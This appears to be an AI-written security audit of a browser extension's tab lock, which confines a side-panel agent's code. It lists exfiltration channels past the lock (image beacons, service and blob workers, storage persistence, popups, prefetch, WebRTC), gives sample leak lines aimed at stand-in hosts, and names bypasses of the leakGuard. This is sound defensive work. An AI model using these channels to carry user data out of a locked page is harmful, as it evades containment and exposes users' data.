# Audit: the tab lock (main at 4057de6)

By Claude Opus 5.5 (the main session), reading `extension/tablock.js` and its wiring in `background.js`
(the delegated audit was stopped early by a safety classifier). **Everything here is "suspected", from
the code and from how browsers behave, until a test confirms it.**

The promise (tablock.js, SECURITY.md): once a side-panel agent's code has run in a tab, nothing there can
post, send or save as the user, or carry what the page shows to another site, until the page is a new one.

| id | severity | status (tested, branch tablock-hardening) | one line |
|---|---|---|---|
| TL-1 | high | **confirmed** in Chrome and Firefox; **fixed** | Cross-site images, scripts, styles, fonts and media are allowed on purpose, so `new Image().src = 'https://other.example/?d=' + data` carries data to any site |
| TL-2 | high | **confirmed** in both (service worker posted and reached another site; blob: SharedWorker reached another site); **fixed** | Requests no tab owns (tabId −1) aren't covered: a SharedWorker made from a `blob:` URL, or the site's own service worker passing a fetch through, can post and send freely |
| TL-3 | high | **confirmed** in both (Cache Storage, a service worker and localStorage survived the unlocking reload); **fixed** (check, then clear or ask) | What the code leaves in the site's storage (Cache Storage behind a cache-first service worker, localStorage/IndexedDB values the site renders, cookies) is still there after the reload that unlocks, so code can come back unlocked |
| TL-4 | medium | **confirmed** in both (another tab of the site posted; no icon, no notice); **fixed** | Other tabs of the same site aren't locked: BroadcastChannel, storage events and SharedWorkers reach them, and the site's own code there may act on what it receives |
| TL-5 | medium | **confirmed in Chrome** (both popups reached another site; a `noopener` popup had no `openerTabId`); not seen in Firefox (its popups had the opener's id and no request got out); **fixed** | Popups: the new tab is locked only after `tabs.onCreated` (a race with its first request), and a `noopener` popup may have no `openerTabId`, so it isn't locked at all; data can ride in its URL |
| TL-6 | low/medium | **confirmed** (Chrome: WebRTC sent STUN, also from a fresh iframe; preconnect connected three ways. Firefox: preconnect connected; WebRTC sent nothing to the test's STUN port); **speed bump** in the page, documented | DNS prefetch and preconnect (`<link rel=dns-prefetch href=//data.example>`), and WebRTC (STUN/TURN and data channels), aren't HTTP requests, so declarativeNetRequest never sees them |
| TL-7 | info | by design (unchanged) | Only side-panel runs (`args.scope`) lock the tab; a terminal agent's `trif run` doesn't |

## Suggested fixes
- **TL-1:** at lock time, record the domains the page has already loaded from: `performance.getEntriesByType('resource')` read in the isolated world, plus the site. Then block image, script, style, font and media requests to any **other** domain, using a rule for those resource types with `excludedRequestDomains` set to that list. The page keeps loading from its CDNs, but the code can't name a new site.
- **TL-2:** while a tab of site S is locked, also block writes and cross-site requests from no tab, made on S's behalf. That's a rule with `tabIds: [-1]` and `initiatorDomains: [S]`, plus the method and cross-site conditions.
  - Cost: the user's other tabs of S, if they post through S's service worker, can't post during the lock. The panel can say so.
- **TL-3, a decision for Tim:**
  - (a) when the tab unlocks, clear S's Cache Storage and service workers (`chrome.browsingData`, origin-scoped): cheap, and the site re-downloads;
  - (b) take a fingerprint of S's localStorage and IndexedDB at lock time and compare at unlock, staying locked and saying why if they changed;
  - (c) document the risk.
  - (a) + (c) is cheap; (b) is stronger but noisier.
- **TL-4, a decision for Tim:** lock every tab of S while one is (writes blocked by `initiatorDomains: [S]` for all of S's tabs), or accept and document it.
- **TL-5:** block navigations to other sites in tabs that didn't exist when the lock started, when the locked site starts them. That's a `main_frame` rule with `initiatorDomains: [S]` and `excludedTabIds` set to the tabs open at lock time. Typed URLs have no initiator, so the user's own new tabs work. Also listen to `webNavigation.onCreatedNavigationTarget`, which reports the source tab even for `noopener`.
- **TL-6:** mostly residual. `chrome.privacy.network.networkPredictionEnabled` off while locked would stop prefetch and preconnect, but needs the `privacy` permission. WebRTC can't be fully stopped from an extension. Document it.

## What held up (from reading)
- **Methods, not request kinds:** POST, PUT, PATCH, DELETE and CONNECT are blocked for every request kind, with no list of types to fall out of date (sendBeacon's names differ by browser).
- **Form posts and sockets:** form posts as page loads, and every WebSocket.
- **Leaving the site:** pages and frames on other sites, and fetch, XHR and event streams to them.
- **The lock comes first:** the tab is locked *before* the agent's code runs, and no lock means no code (`run`).
- **The rules are checked:** `addRules` reads back what the browser kept (one tab, the methods, the site left out of the cross-site rule) and refuses if it was changed.
- **Telling documents apart:** the marker lives in the extension's isolated world, which page code can't see or set. URL changes (`pushState`) don't unlock, and pages the extension can't script stay locked.
- **Back/forward cache:** a page back from the back/forward cache locks again and reloads.
- **Opened tabs:** tabs a locked tab opens are locked while it is (with the caveats in TL-5).

## Tested (tablock-hardening)

`tests/e2e/scenario.js` `tabLockHardeningCheck` tries each item from a page a stand-in side-panel agent
locked, in Chrome and Firefox, first on the unfixed code (the "confirmed" column), then on the fixes.
Speculation rules prefetched nothing in either browser before the fix (Chrome only prefetches some
cross-site URLs), so that channel wasn't confirmed; the guard covers it anyway.

## The fixes, and what they cost

- **TL-1:** a fifth per-tab rule blocks images, scripts, styles, fonts and media from any site the page
  hadn't loaded from when the lock started (read from `performance.getEntriesByType('resource')` in the
  isolated world, plus the site). Cost: a page that starts using a new CDN during the lock (lazy images)
  shows those broken until the reload; the resource timing buffer (250 entries by default) can miss
  sites a busy page used.
- **TL-2, TL-4, TL-5:** five site rules while any tab of the site has agent code, on what the site
  starts (`initiatorDomains: [site]`): writes, form posts and sockets in any tab and in none; requests
  from no tab (tabId −1) only to the site and what the page already used; and `main_frame` loads to
  other sites in tabs that weren't open when the lock started (`excludedTabIds`). The site's other tabs,
  and tabs of the site opened during the lock, are listed as locked (`kind: 'site'`): paused icon, the
  notice "your agent ran code in another tab" with Show that tab. They unlock when the last tab with
  agent code unlocks; a tab that leaves the site unlocks. Costs: no posting from any tab of the site
  during the lock, and no live sockets there; a page of the site the user opens in a new tab can't
  follow links to other sites until the lock ends (typed addresses and bookmarks load).
  - `webNavigation.onCreatedNavigationTarget` isn't used: it needs the `webNavigation` permission, which
    TRIF doesn't have (Chrome's warning for it is the one `tabs` already shows, but Firefox would ask
    for it in an update). It isn't needed for the gap: the popup's first request is blocked by the
    initiator rule before any listener could run, and a popup to the site itself is locked as a tab of
    the site.
- **TL-3:** a fingerprint at lock time, compared on the new page before unlocking. Cache Storage or
  service workers changed: cleared from the isolated world for the site's origin (no `browsingData`
  permission: TRIF doesn't have it; Chrome shows no warning for it, Firefox would ask in an update),
  then a reload past the cache. localStorage, sessionStorage, IndexedDB or cookies changed: still
  locked, and the panel asks to reset the site's saved data or keep it. Costs: a site that writes its
  own storage during the lock (most big ones) asks after every lock; reset clears cookies the page can
  see, which may sign the user out. Not covered: IndexedDB contents (names and versions only), HttpOnly
  cookies (page code can't set those either).
- **TL-6 (speed bump, no new permission):** before the agent's code, `leakGuard` runs in the page's world:
  WebRTC's constructors throw; `<link rel=dns-prefetch|preconnect|prefetch|prerender|modulepreload>`
  can't be set by `rel` or `setAttribute`, and a MutationObserver removes any that appear; a
  `speculationrules` script gets a type that does nothing; frames of the page's origin get the same as
  the page reaches them (`contentWindow`, `contentDocument`). Bypasses, by design of a speed bump: a
  `<link>` written as HTML (`innerHTML`, `insertAdjacentHTML`) can be acted on before the observer takes
  it out (seen in both browsers: it connected, while `rel` and `setAttribute` didn't); a realm the guard never sees (`window.frames[0]` of a frame
  made from HTML, a `window.open`ed same-origin window) has the originals; DNS prefetch the browser does
  on its own. Stopping those for real needs `chrome.privacy` (the `privacy` permission), not asked for.
